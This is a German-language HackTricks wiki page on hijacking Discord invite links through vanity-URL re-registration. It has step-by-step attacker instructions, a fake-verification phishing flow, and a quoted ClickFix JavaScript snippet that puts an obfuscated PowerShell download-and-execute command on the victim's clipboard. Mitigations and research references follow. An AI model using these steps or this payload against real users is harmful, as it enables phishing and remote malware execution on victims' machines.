# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord Invite Hijacking missbraucht die Regeln zur Wiederverwendung von Custom-Vanity-Links: Ein abgelaufener temporärer Invite-Code oder ein gelöschter permanenter Code, der nur aus Kleinbuchstaben und Ziffern besteht, kann als Vanity-Link auf einem Server mit Level-3-Boost registriert werden. Ein Custom-Vanity-Link kann ebenfalls verfügbar werden, wenn der ursprüngliche Server seinen Level-3-Boost verliert; bei einem temporären Invite mit Großbuchstaben kann ein Angreifer die kleingeschriebene Vanity-Form vorab registrieren, während der reguläre Invite aktiv bleibt. Die Weiterleitung beginnt jedoch erst, nachdem dieser Invite abgelaufen ist.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

Das beobachtete Risiko unterscheidet sich je nach Invite-Typ:<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporärer Invite-Link | ✅          | Nach dem Ablauf wird der Code verfügbar und kann von einem geboosteten Server erneut als Vanity-URL registriert werden. |
| Permanenter Invite-Link | ⚠️          | Wenn er gelöscht wurde und nur aus Kleinbuchstaben und Ziffern besteht, kann der Code wieder verfügbar werden.        |
| Custom-Vanity-Link    | ✅          | Wenn der ursprüngliche Server seinen Level-3-Boost verliert, wird sein Vanity-Invite für eine neue Registrierung verfügbar.    |

## Exploitation Steps

1. Reconnaissance
- Überwache öffentliche Quellen (Foren, soziale Medien, Telegram-Kanäle) auf Invite-Links, die dem Muster `discord.gg/{code}` oder `discord.com/invite/{code}` entsprechen.<sup>[[1]](#references)</sup>
- Sammle interessante Invite-Codes (temporäre oder Vanity-Codes).<sup>[[1]](#references)</sup>
2. Pre-registration
- Erstelle einen Discord-Server mit Level-3-Boost-Berechtigungen oder verwende einen bestehenden.<sup>[[1]](#references)[[2]](#references)</sup>
- Versuche unter **Server Settings → Vanity URL**, den Ziel-Invite-Code zuzuweisen. Wenn er akzeptiert wird, ist der Code durch den bösartigen Server reserviert.<sup>[[1]](#references)</sup>
3. Hijack Activation
- Warte bei temporären Invites, bis der ursprüngliche Invite abläuft (oder lösche ihn manuell, falls du die Quelle kontrollierst).<sup>[[1]](#references)</sup>
- Bei Codes mit Großbuchstaben kann die kleingeschriebene Variante sofort beansprucht werden, die Weiterleitung wird jedoch erst nach Ablauf aktiviert.<sup>[[1]](#references)</sup>
4. Silent Redirection
- Benutzer, die den alten Link aufrufen, werden nahtlos an den vom Angreifer kontrollierten Server weitergeleitet, sobald der Hijack aktiv ist.<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. Beschränke die Server-Kanäle so, dass nur ein **#verify**-Kanal sichtbar ist.<sup>[[1]](#references)</sup>
2. Setze einen Bot (z. B. **Safeguard#0786**) ein, der neue Benutzer auffordert, sich per OAuth2 zu verifizieren.<sup>[[1]](#references)</sup>
3. Der Bot leitet Benutzer unter dem Vorwand eines CAPTCHA- oder Verifizierungsschritts zu einer Phishing-Website (z. B. `captchaguard.me`) weiter.<sup>[[1]](#references)</sup>
4. Implementiere den **ClickFix**-UX-Trick:<sup>[[1]](#references)</sup>
- Zeige eine fehlerhafte CAPTCHA-Meldung an.
- Leite Benutzer an, den **Win+R**-Dialog zu öffnen, einen vorab geladenen PowerShell-Befehl einzufügen und Enter zu drücken.

### ClickFix Clipboard Injection Example

Die Kampagne verwendete JavaScript, um einen schädlichen PowerShell-Befehl in die Zwischenablage zu kopieren:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Dieser Ansatz vermeidet direkte Datei-Downloads und nutzt vertraute UI-Elemente, um den Verdacht der Benutzer zu verringern.<sup>[[1]](#references)</sup>

## Mitigations

- Bevorzugt permanente Einladungslinks und stellt sicher, dass der Code mindestens einen Großbuchstaben enthält; gelöschte permanente Codes mit Großbuchstaben können nicht als vanity links wiederverwendet werden.<sup>[[1]](#references)</sup>
- Rotiert Einladungscodes regelmäßig und widerruft alte Links.
- Überwacht den Boost-Status des Discord-Servers und die Beanspruchung von vanity URLs.<sup>[[1]](#references)[[2]](#references)</sup>
- Klärt Benutzer darüber auf, die Authentizität des Servers zu überprüfen und das Ausführen aus der Zwischenablage eingefügter Befehle zu vermeiden.

## References

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Benutzerdefinierter Einladungslink – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
